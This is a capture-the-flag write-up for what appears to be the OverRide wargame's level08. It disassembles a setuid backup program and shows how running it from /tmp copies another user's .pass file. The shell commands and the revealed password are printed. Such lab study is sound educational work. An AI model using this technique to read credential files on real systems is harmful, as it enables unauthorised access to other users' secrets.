```
0x00000000004008c4  log_wrapper
0x00000000004009f0  main
```

```
 <+90>:	mov    $0x400d6b,%edx           "w"
 <+95>:	mov    $0x400d6d,%eax           "./backups/.log"  
 <+106>:	callq  0x4007c0 <fopen@plt>   log_PTR *fopen("./backups/.log", "w")
 <+111>:	mov    %rax,-0x88(%rbp)       log_PTR
 
  <+118>:	cmpq   $0x0,-0x88(%rbp)      cmp(0, FILE_PTR)
  <+126>:	jne    0x400a91 <main+161>
  <+128>:	mov    $0x400d7c,%eax        "ERROR: Failed to open %s\n"
  <+133>:	mov    $0x400d6d,%esi        "./backups/.log"
  <+138>:	mov    %rax,%rdi
  <+141>:	mov    $0x0,%eax
  <+146>:	callq  0x400730 <printf@plt>
  <+151>:	mov    $0x1,%edi
  <+156>:	callq  0x4007d0 <exit@plt>  exit(1)
 
```

```
<+161>:	mov    -0xa0(%rbp),%rax         argv1
<+168>:	add    $0x8,%rax

<+175>:	mov    -0x88(%rbp),%rax         log_PTR
<+182>:	mov    $0x400d96,%esi           "Starting back up: "
<+190>:	callq  0x4008c4 <log_wrapper>   log_wrapper(log_PTR,  "Starting back up: ", argv1)
```
```
    <+195>:	mov    $0x400da9,%edx
    <+200>:	mov    -0xa0(%rbp),%rax     arv1
    <+207>:	add    $0x8,%rax
    <+211>:	mov    (%rax),%rax
    <+214>:	mov    %rdx,%rsi
    <+217>:	mov    %rax,%rdi
    <+220>:	callq  0x4007c0 <fopen@plt>  input_file_PTR = fopen(argv1, "r")
    <+225>:	mov    %rax,-0x80(%rbp)      input_file_PTR
```
```
    <+334>:	mov    -0xa8(%rbp),%rcx     the maximum number of characters to append
    <+341>:	mov    %rdx,%rdi
    <+344>:	repnz scas %es:(%rdi),%al
    <+346>:	mov    %rcx,%rax            the maximum number of characters to append
   
   
   
    <+370>:	mov    -0xa0(%rbp),%rax       argv1
    <+377>:	add    $0x8,%rax
    <+381>:	mov    (%rax),%rax
    <+384>:	mov    %rax,%rcx
    <+387>:	lea    -0x70(%rbp),%rax       This variable will be used as the destination buffer for the strncat function
    <+391>:	mov    %rcx,%rsi
    <+394>:	mov    %rax,%rdi
    <+397>:	callq  0x400750 <strncat@plt>   strncat(dest_file, argv1, len(argv[1]))
    
    
    the register %rcx is set to the number of bytes between the start of the string at -0x70(%rbp)
    and the first occurrence of the value 0xffffffffffffffff (-1).
    The code then subtracts this value from the constant 0x63 to determine
    the maximum length of the string that can be concatenated onto the input string.

     the code loads the address of the input string stored at -0xa0(%rbp)/argv1 into %rax,
     and then uses the strncat function to concatenate the maximum allowed number of characters
     from the input string onto the end of the string stored at -0x70(%rbp).
```

```
    <+397>:	callq  0x400750 <strncat@plt>
    <+402>:	lea    -0x70(%rbp),%rax        dest_file
    <+406>:	mov    $0x1b0,%edx             file mode
    <+411>:	mov    $0xc1,%esi              file access mode
    <+416>:	mov    %rax,%rdi
    <+419>:	mov    $0x0,%eax
    <+424>:	callq  0x4007b0 <open@plt>    fd = open(dest_file, 0x1b0, 0xc1)
    <+429>:	mov    %eax,-0x78(%rbp)       fd 
```
```
    <+485>:	lea    -0x71(%rbp),%rcx      buf
    <+489>:	mov    -0x78(%rbp),%eax      fd
    <+492>:	mov    $0x1,%edx
    <+497>:	mov    %rcx,%rsi
    <+500>:	mov    %eax,%edi
    <+502>:	callq  0x400700 <write@plt>  write(fd, &buf, 1)
    
    write(int fd, const void *buf, size_t count);
```
```
    <+510>:	mov    -0x80(%rbp),%rax
    <+514>:	mov    %rax,%rdi
    <+517>:	callq  0x400760 <fgetc@plt>  buf = fgetc(input_file_PTR)
    <+522>:	mov    %al,-0x71(%rbp)       buf
    <+525>:	movzbl -0x71(%rbp),%eax
    <+529>:	cmp    $0xff,%al             check for EOF
```


the program open the file "./backups/.log" for writing as well as argv1 for reading

append argv1 to "./backups/" and try to open it

the main() start copying character by character from the file that we want to backup argv1و to the backup file.

(write every character of argv1 to the new file)



```
log_wrapper(FILE_PTR,  "Starting back up: ", argv1)
{

    <+11>:	mov    %rdi,-0x118(%rbp)   arg1
    <+18>:	mov    %rsi,-0x120(%rbp)   arg2
    <+25>:	mov    %rdx,-0x128(%rbp)   arg3
    
    <+47>:	mov    -0x120(%rbp),%rdx
    <+54>:	lea    -0x110(%rbp),%rax  buffer1
    <+61>:	mov    %rdx,%rsi
    <+64>:	mov    %rax,%rdi
    <+67>:	callq  0x4006f0 <strcpy@plt>   strcpy(buffer1 , arg2)
    
    
    <+182>:	lea    -0x1(%rax),%rdx
    <+186>:	lea    -0x110(%rbp),%rax
    <+193>:	add    %rdx,%rax
    <+196>:	mov    %rsi,%rdx
    <+199>:	mov    %r8,%rsi
    <+202>:	mov    %rax,%rdi
    <+205>:	mov    $0x0,%eax
    <+210>:	callq  0x400740 <snprintf@plt>   snprintf(buffer1, rsi, r8)
    
    
    
    <+243>:	mov    $0x400d4e,%ecx           "LOG: %s\n"
    <+248>:	lea    -0x110(%rbp),%rdx
    <+255>:	mov    -0x118(%rbp),%rax
    <+262>:	mov    %rcx,%rsi
    <+265>:	mov    %rax,%rdi
    <+268>:	mov    $0x0,%eax
    <+273>:	callq  0x4007a0 <fprintf@plt>   fprintf( -0x118(%rbp) , "LOG: %s\n" ,  buffer1)
}
```

so we will try to back-up the content of /home/users/level09/.pass to get the next password

but since we do not have permission to create any file in backups/ we'll use /tmp
```
mkdir -p /tmp/backups/home/users/level09
level08@OverRide:~$ ./level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
```
Ooops
```
cd /tmp/
mkdir -p backups/home/users/level09
level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass

level08@OverRide:/tmp$ cat ~/backups/.log
LOG: Starting back up: /home/users/level09/.pass

level08@OverRide:/tmp$ cat backups/home/users/level09/.pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```








